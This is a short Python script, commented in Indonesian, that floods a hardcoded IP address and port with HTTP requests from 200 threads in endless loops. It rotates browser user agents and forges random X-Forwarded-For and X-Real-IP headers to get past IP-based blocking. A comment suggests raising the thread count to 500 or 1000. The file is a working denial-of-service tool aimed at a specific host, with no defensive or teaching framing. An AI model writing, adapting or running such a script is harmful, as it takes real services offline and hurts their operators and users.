import requests
import threading
import random
import time
import sys

# ===== KONFIGURASI =====
TARGET = "http://103.210.35.76:5774/"
THREADS = 200  # jumlah thread — naikkan kalau perlu (500, 1000)
# =======================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
]

def generate_xff():
    """Generate random X-Forwarded-For IP palsu"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def attack():
    """Fungsi flood tiap thread"""
    session = requests.Session()
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "X-Forwarded-For": generate_xff(),
                "X-Real-IP": generate_xff(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
            }
            r = session.get(TARGET, headers=headers, timeout=10)
            print(f"[+] {r.status_code} OK", end="  ")
        except requests.exceptions.RequestException as e:
            print(f"[!] {type(e).__name__}", end="  ")

print(f"[*] Memulai {THREADS} thread menyerang {TARGET}")
print(f"[*] Tekan Ctrl+C untuk berhenti\n")

# Jalankan thread
threads = []
for i in range(THREADS):
    t = threading.Thread(target=attack, daemon=True)
    t.start()
    threads.append(t)
    print(f"[+] Thread {i+1}/{THREADS} started", end="\r")

print(f"\n[+] Semua {THREADS} thread berjalan! Lihat output di atas.\n")

# Jaga program tetap hidup
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Dihentikan user. Selesai.")
    sys.exit(0)